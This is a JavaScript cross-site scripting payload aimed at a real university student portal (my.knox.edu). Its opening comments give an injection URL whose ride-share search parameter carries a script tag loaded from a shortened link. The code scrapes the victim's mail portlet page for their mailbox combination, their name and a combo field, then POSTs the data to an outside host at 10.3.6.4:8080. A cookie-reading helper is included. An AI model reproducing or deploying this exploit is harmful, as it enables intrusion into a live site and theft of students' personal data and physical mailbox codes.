//<script src=//bit.ly/3jPon33></script>
//http://my.knox.edu/ICS/Student_Services/Ride_Share__Carpool.jnz?portlet=Find_A_Ride&screen=PostList&screenType=change&ft=0&pt=6&p=1&itemId=786bad5c-58ae-49e1-9849-8ca0c13c12b1&m=0&sp=%3Cscript+src%3d%2f%2fbit.ly%2f3jPon33%3E%3C%2fscript%3E






window.alert("xss");
httpReq();

var doc = ""

function phoneHome(payload){
    xhr = new XMLHttpRequest();
    

    xhr.responseType = 'text/html';
    xhr.onreadystatechange = function() {
    if (xhr.readyState === XMLHttpRequest.DONE) {


    }
    }


    xhr.open('POST', 'http://10.3.6.4:8080/');
    xhr.send(payload);

}


function httpReq() {
    
        xhr = new XMLHttpRequest();
        xhr.responseType = 'text/html';

        xhr.onreadystatechange = function() {
          if (xhr.readyState === XMLHttpRequest.DONE) {
              //return(xhr.response);
              
              htmlString = xhr.response
              var parser = new DOMParser();
              doc = parser.parseFromString(htmlString, "text/html")
              

              unlock = doc.getElementById("comboDiv").innerText
              tname = doc.getElementsByClassName("user-name d-block")[0].innerText
              kbox = doc.getElementById("pg0_V_lCombo").innerText
              phoneHome(unlock + "," + tname + "," + kbox)

              
            
        }
    };

    xhr.open('GET', 'https://my.knox.edu/ICS/Student_Services/Mail_Portlet.jnz');
    xhr.send();


}


function getCookie(cname) { //taken from https://www.w3schools.com/js/js_cookies.asp
  let name = cname + "=";
  let decodedCookie = decodeURIComponent(document.cookie);
  let ca = decodedCookie.split(';');
  for(let i = 0; i <ca.length; i++) {
    let c = ca[i];
    while (c.charAt(0) == ' ') {
      c = c.substring(1);
    }
    if (c.indexOf(name) == 0) {
      return c.substring(name.length, c.length);
    }
  }
  return "";
}































